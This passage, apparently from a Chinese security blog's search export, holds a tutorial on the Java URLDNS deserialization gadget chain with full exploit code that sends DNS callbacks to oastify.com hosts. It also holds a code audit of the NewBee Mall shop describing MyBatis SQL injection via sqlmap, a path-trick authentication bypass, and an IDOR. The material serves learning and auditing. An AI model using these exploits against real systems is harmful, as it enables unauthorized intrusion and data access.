class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/./images/java%E5%AE%89%E5%85%A8/URLDNS%E9%93%BE/image-20241203210838893.png" alt="image-20241203210838893"></p>
<p>收到dns请求</p>
<h2 id="入口类HashMap分析"><a href="#入口类HashMap分析" class="headerlink" title="入口类HashMap分析"></a>入口类HashMap分析</h2><p>入口类我们选择HashMap类,HaspMap类继承Serializable,并且他重写了readObject,满足了条件1与2</p>
<p><img src="/./images/java%E5%AE%89%E5%85%A8/URLDNS%E9%93%BE/image-20241203211220667.png" alt="image-20241203211220667"></p>
<p>他重写的readObject方法,我们来看最后一行代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">putVal(hash(key), key, value, false, false);</span><br></pre></td></tr></table></figure>

<p><img src="/./images/java%E5%AE%89%E5%85%A8/URLDNS%E9%93%BE/image-20241203211323348.png" alt="image-20241203211323348"></p>
<p>它调用了该类中的 <strong>hash 函数来处理 key 变量</strong>。接下来，我们分析一下 key 参数是如何获得的。</p>
<p>往上跟踪</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">K key = (K) s.readObject();</span><br></pre></td></tr></table></figure>

<p>定义了一个K类型的key变量，然后对反序列化的输入流进行反序列化，并把反序列化出的键赋值给key变量</p>
<p>我们再跟入hash函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="type">int</span> h;</span><br><span class="line">        <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>key需要传入对象,如何对象不为空,就执行<strong>h &#x3D; key.hashCode()</strong>,也就是调用key当中的hashCode</p>
<h2 id="执行类URL分析"><a href="#执行类URL分析" class="headerlink" title="执行类URL分析"></a>执行类URL分析</h2><p>执行类我们选择URL类,他继承了Serializable,满足条件1,并且在它当中重写了hashCode方法,我们跟入hashCode方法</p>
<p><img src="/./images/java%E5%AE%89%E5%85%A8/URLDNS%E9%93%BE/image-20241203212112737.png" alt="image-20241203212112737"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们跟入hashCode的值,发现它默认就是-1,也就是说<strong>默认情况下</strong>会执行<strong>handler.hashCode(this)</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="variable">hashCode</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/./images/java%E5%AE%89%E5%85%A8/URLDNS%E9%93%BE/image-20241203212357074.png" alt="image-20241203212357074"></p>
<p>我们再跟入handler ,发现handler属性代表了URLStreamHandler类的临时对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">transient</span> URLStreamHandler handler;</span><br></pre></td></tr></table></figure>

<p>经分析，也就是把这一整个URL对象作为参数，传入了<strong>URLStreamHandler类的hashCode方法</strong></p>
<p> 那我们去URLStreamHandler类当中，查看下hashCode方法的代码</p>
<p>跟进到<strong>URLStreamHandler</strong>类的<strong>hashCode</strong>方法中可见<strong>hashCode</strong>会调用**getHostAddress(u)<strong>方法，而</strong>getHostAddress(u)**可以调用dns请求，达到执行类的目的</p>
<p>hashCode方法并会把求出的 hash值赋值给h 返回给 URL对象中的hashCode属性<em><strong>（这里记住，下面有用到）</strong></em></p>
<p><strong>getHostAddress</strong>函数:</p>
<p>会对URL对象代表的链接进行DNS解析，获取其ip地址，我们使用 DNSLog 平台可以检测到该函数的访问</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the protocol part.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">protocol</span> <span class="operator">=</span> u.getProtocol();</span><br><span class="line">    <span class="keyword">if</span> (protocol != <span class="literal">null</span>)</span><br><span class="line">        h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the host part.</span></span><br><span class="line">    <span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br><span class="line">    <span class="keyword">if</span> (addr != <span class="literal">null</span>) &#123;</span><br><span class="line">        h += addr.hashCode();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();</span><br><span class="line">        <span class="keyword">if</span> (host != <span class="literal">null</span>)</span><br><span class="line">            h += host.toLowerCase().hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the file part.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> u.getFile();</span><br><span class="line">    <span class="keyword">if</span> (file != <span class="literal">null</span>)</span><br><span class="line">        h += file.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the port part.</span></span><br><span class="line">    <span class="keyword">if</span> (u.getPort() == -<span class="number">1</span>)</span><br><span class="line">        h += getDefaultPort();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        h += u.getPort();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the ref part.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">ref</span> <span class="operator">=</span> u.getRef();</span><br><span class="line">    <span class="keyword">if</span> (ref != <span class="literal">null</span>)</span><br><span class="line">        h += ref.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h2><p>如果我们传入HashMap的对象为URL,它的readObject方法会调用它自己本身的hash方法,如何hash方法里面会触发h &#x3D; key.hashCode(),因为我们key传入的对象为URL,所以我们执行的是URL的hashCode()方法.</p>
<p>在URL类中,hashCode这个属性本身默认值为-1,所以hashCode方法会执行handler.hashCode(this),然后handler是URLStreamHandler的临时对象,所以我们执行的是URLStreamHandler类的hashCode方法.</p>
<p>在URLStreamHandler类的hashCode方法中它传入URL对象,并且有个方法getHostAddress()会对URL对象进行dns请求,并会把求出的 hash值 返回给 URL对象中的hashCode属性</p>
<h2 id="EXP编写"><a href="#EXP编写" class="headerlink" title="EXP编写"></a>EXP编写</h2><h3 id="exp思路"><a href="#exp思路" class="headerlink" title="exp思路"></a>exp思路</h3><p>根据上面的链路分析，我们首先需要创建一个指向 <strong>DNSLog 平台</strong>链接的 <strong>URL 对象</strong>，然后作为键传入 HashMap 数组，最后将该数组进行序列化，再反序列化并调用其 readObject 方法。这个过程会将 URL 对象赋值给 key，然后使用 hash 方法处理 URL 对象，最终调用 URL 对象的 hashCode 方法。以 URL 对象为参数，调用 URLStreamHandler 类的 hashCode 方法，从而访问 URL 对象指向的链接。</p>
<h3 id="初步exp"><a href="#初步exp" class="headerlink" title="初步exp"></a>初步exp</h3><p>Person.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123;</span></span><br><span class="line"><span class="comment">//        ois.defaultReadObject();</span></span><br><span class="line"><span class="comment">//        // 执行外部命令弹出计算机</span></span><br><span class="line"><span class="comment">//        Runtime.getRuntime().exec(&quot;calc&quot;);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>SerializationTest.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;aa&quot;</span>,<span class="number">22</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">        serialize(person);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>UnserializationTest.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnserializationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"><span class="comment">//        Person person =(Person) unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line"><span class="comment">//        System.out.println(person.toString());</span></span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();</span><br><span class="line">        URL url= <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://5w27pcihu5gwk0r7oc39drigo7uzip6e.oastify.com&quot;</span>);</span><br><span class="line">        hashmap.put(url,<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String FileName)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(FileName));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="问题发现"><a href="#问题发现" class="headerlink" title="问题发现"></a>问题发现</h3><p>我们之前测试dns请求时,发现它在反序列化与不反序列化之前都会产生dns请求,会对我们的判断产生影响,我们跟入hashmap.put方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们对比两个类发现可以看到是一模一样的</p>
<p>put方法</p>
<p><img src="/./images/java%E5%AE%89%E5%85%A8/URLDNS%E9%93%BE/image-20241203220135779.png" alt="image-20241203220135779"></p>
<p>readObject方法</p>
<p><img src="/./images/java%E5%AE%89%E5%85%A8/URLDNS%E9%93%BE/image-20241203220152690.png" alt="image-20241203220152690"></p>
<p>需要注意的是假如提前触发的话，反序列化的时候便<strong>不会再进行DNS解析</strong>。</p>
<p> 我们再次回到URL类中的hashCode方法，并看一下其hashCode属性的定义。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="variable">hashCode</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">        hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，只有当 hashCode 的值为 <strong>-1</strong> 时，才会执行 <strong>hashCode &#x3D; handler.hashCode(this);<strong>，从而进行 DNS 解析。解析完成后，hashCode 属性被赋值为这个 URL 解析的哈希值，即一个正数。因此在序列化时这个 hashCode 属性的值保持不变，当反序列化时，由于 <strong>hashCode !&#x3D; -1</strong>，</strong>直接进入 if 语句</strong>，执行 **return hashCode;**，最终导致无法再次触发 DNS 解析。</p>
<h3 id="exp改进"><a href="#exp改进" class="headerlink" title="exp改进"></a>exp改进</h3><p>为了避免在 put 时提前触发 DNS 解析，我们可以通过反射先将 hashCode 值修改为一个不为 -1 的数字。然后在 hashmap.put代码运行完成后，再将hashcode属性设置回-1，反序列化时就会正确调用。示例如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">field.set(url,<span class="number">123</span>); <span class="comment">//将url的hashcode属性改为123使其不等于-1</span></span><br><span class="line">map.put(url,<span class="string">&quot;2333&quot;</span>); <span class="comment">//这里的value用不上，随便设置</span></span><br><span class="line">field.set(url,-<span class="number">1</span>);<span class="comment">//put完之后，我们就需要将hashcode属性改回成-1，从而能执行handler.hashCode(this);</span></span><br><span class="line"><span class="comment">//通过反射我们可以动态修改一个对象中的属性和方法</span></span><br></pre></td></tr></table></figure>

<h3 id="最终exp"><a href="#最终exp" class="headerlink" title="最终exp"></a>最终exp</h3><p>将序列化与反序列化弄到一个文件执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test_Payload</span> &#123;</span><br><span class="line">    <span class="comment">//序列化</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//反序列化</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String file)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//创建入口类和执行类的对象</span></span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashmap= <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://cp5eijbonc93d7kehjwg6ybnhen6bxzm.oastify.com&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射调用URL类，设置hashcode!=-1</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCodeDeclaredField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCodeDeclaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//设置hashcode值为1，反正不为-1就行</span></span><br><span class="line">        hashCodeDeclaredField.set(url,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//实际上这一步已经调用了dns请求了，因为put方法会调用hash -- 调用putVal -- 调用key.hashcode</span></span><br><span class="line">        <span class="comment">//所以需要想办法阻止这一步发起dns请求,怎么阻止呢，就是让URL.hashcode !=-1，具体代码如上所示</span></span><br><span class="line">        hashmap.put(url,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//这里要再把hashCode的值改回来，改成-1</span></span><br><span class="line">        hashCodeDeclaredField.set(url,-<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        serialize(hashmap);</span><br><span class="line">        <span class="comment">//反序列化，反序列化时调用了dns请求</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="特别回顾"><a href="#特别回顾" class="headerlink" title="特别回顾"></a>特别回顾</h1><p>之前学习的时候,一直没搞懂readObject中不是有与put方法一样的代码吗,为什么还需要put方法,后面才知道,put方法是存储key与value,存储一个URL对象为key,这样子我们反序列化HashMap的时候,readObject方法中的hash方法就有了Object对象URL,这样子入口类与执行类就产生了联系</p>
]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>新蜂商城代码审计</title>
    <url>/2024/06/04/%E6%96%B0%E8%9C%82%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">后台注入</span><br><span class="line">前台注入</span><br><span class="line">鉴权绕过</span><br><span class="line">越权漏洞</span><br></pre></td></tr></table></figure>

<h1 id="组件漏洞"><a href="#组件漏洞" class="headerlink" title="组件漏洞"></a>组件漏洞</h1><p>查看pom文件并没有什么存在漏洞地方,使用了mybatis,可能存在注入</p>
<h1 id="单点漏洞"><a href="#单点漏洞" class="headerlink" title="单点漏洞"></a>单点漏洞</h1><h2 id="后台注入"><a href="#后台注入" class="headerlink" title="后台注入"></a>后台注入</h2><p>它运用了mabatis组件,我们搜索关键字${</p>
<p>得到这四个地方使用了</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/%E6%96%B0%E8%9C%82%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241204151103719.png" alt="image-20241204151103719"></p>
<p>我们跟入第一个</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/%E6%96%B0%E8%9C%82%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241204151505201.png" alt="image-20241204151505201"></p>
<if test="goodsName!=null and goodsName!=''">

<p>这是一个条件判断，它检查变量 goodsName 是否不为 null 且不为空字符串。如果条件为真，下面的 SQL 语句块将会被包含在生成 的查询语句中；否则，该 SQL 语句块将被忽略。 </p>
<p>and goods_name like CONCAT(‘%’,’${goodsName}’,’%’):</p>
<p>这是在生成的 SQL 查询语句中的 一个条件部分。它使用了 like 关键字来进行模糊匹配，查找包含特定字符串的记录。 CONCAT() 函数是用于连接字符串的。在这里，它连接了三个部分： ‘%’ 是一个百分号字符，用于匹配任意字 符； ${goodsName} 是一个占位符，它会被实际的 goodsName 变量的值替换；再次使用 ‘%’ 进 行匹配结尾的任意字符。这样的组合就可以实现在 goods_name 列中模糊匹配指定的字符串。</p>
<p>我们从NewBeeMallGoodsMapper.xml跟入到NewBeeMallGoodsMapper.java</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/%E6%96%B0%E8%9C%82%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241204151655512.png" alt="image-20241204151655512"></p>
<p>我们在看看谁实现了findNewBeeMallGoodsList方法,NewBeeMallGoodsServiceImpl.java实现了</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/%E6%96%B0%E8%9C%82%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241204151749063.png" alt="image-20241204151749063"></p>
<p>我们再看谁调用了getNewBeeMallGoodsPage方法,NewBeeMallGoodsController.java调用了,并且我们来到了控制层</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/%E6%96%B0%E8%9C%82%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241204151831865.png" alt="image-20241204151831865"></p>
<p>我们拼接路径,去网站抓包,这里直接拼接路径是不对的,会没有参数,爆出异常,我们通过goods目录去测试功能再到数据包中查找goods&#x2F;list路径</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/%E6%96%B0%E8%9C%82%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241204152004544.png" alt="image-20241204152004544"></p>
<p>我们发现没有goodsName参数,我们手动添加,直接放入sqlmap跑</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/%E6%96%B0%E8%9C%82%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241204152310781.png" alt="image-20241204152310781"></p>
<h2 id="前台注入"><a href="#前台注入" class="headerlink" title="前台注入"></a>前台注入</h2><p>前台注入在keyword参数,步骤去上面后台注入一样,但是它不需要后台访问,直接前台搜索页面即可</p>
<h2 id="鉴权绕过"><a href="#鉴权绕过" class="headerlink" title="鉴权绕过"></a>鉴权绕过</h2><p>我们搜索&#x2F;*</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/%E6%96%B0%E8%9C%82%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241204152803889.png" alt="image-20241204152803889"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/admin/**</span><br></pre></td></tr></table></figure>

<p>这种都会被拦截</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/admin/login</span><br><span class="line">/admin/dist/**</span><br><span class="line">/admin/plugins/**</span><br></pre></td></tr></table></figure>

<p>这三个不会被拦截</p>
<p>我们看看哪里运用了这个拦截器</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/%E6%96%B0%E8%9C%82%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241204153315304.png" alt="image-20241204153315304"></p>
<p>我们跟入AdminLoginInterceptor.java</p>
<p>发现他是getRequestURI,可以尝试绕过</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/%E6%96%B0%E8%9C%82%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241204153446870.png" alt="image-20241204153446870"></p>
<p>要以admin开头,我们可以尝试;或者.绕过</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/%E6%96%B0%E8%9C%82%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241204154049825.png" alt="image-20241204154049825"></p>
<p>成功绕过</p>
<h2 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h2><p>在前台更改个人信息的地方,就是通过传入的 userId 获取用户信息后进行信息更新 操作。整个流程没有任何权限校验，没有判断 userId 所属关系，进而造成了越权漏洞。</p>
<p>在白盒中,逻辑漏洞不好测试,我们通过黑盒去测试.</p>
</if>]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Java代码审计</tag>
      </tags>
  </entry>
</search>
